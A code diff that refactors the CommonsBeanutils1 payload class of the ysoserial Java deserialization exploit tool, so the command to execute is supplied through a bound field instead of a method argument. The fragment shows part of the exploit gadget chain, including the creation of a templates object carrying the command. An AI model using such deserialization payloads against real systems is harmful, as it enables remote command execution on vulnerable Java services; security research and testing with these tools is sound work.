@@ -5,6 +5,8 @@ import java.util.PriorityQueue;
 
 import org.apache.commons.beanutils.BeanComparator;
 
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
@@ -13,8 +15,17 @@ import ysoserial.payloads.util.Reflections;
 @SuppressWarnings({ "rawtypes", "unchecked" })
 @Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
 public class CommonsBeanutils1 implements ObjectPayload<Object> {
+	
+	@Bind private String command;
 
+	/**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
 	public Object getObject(final String command) throws Exception {
+		return getObject();
+	}
+
+	public Object getObject() throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
 		// mock method name until armed
 		final BeanComparator comparator = new BeanComparator("lowestSetBit");
